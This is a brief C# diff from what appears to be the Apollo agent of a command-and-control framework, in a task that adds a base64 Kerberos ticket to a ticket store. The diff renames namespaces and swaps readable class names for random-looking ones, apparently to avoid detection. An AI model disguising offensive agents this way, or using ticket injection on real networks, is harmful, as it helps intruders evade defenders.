@@ -10,18 +10,18 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.Serialization;
-using ApolloInterop.Classes;
-using ApolloInterop.Features.KerberosTickets;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Features.KerberosTickets;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 
 namespace Tasks;
 
-public class ticket_store_add : Tasking
+public class StealthResolverDFB5 : Tasking
 {
     
     [DataContract]
-    internal struct TicketStoreAddParameters
+    internal struct SecureHandlerE67B
     {
         [DataMember(Name = "base64ticket")]
         internal string base64Ticket;
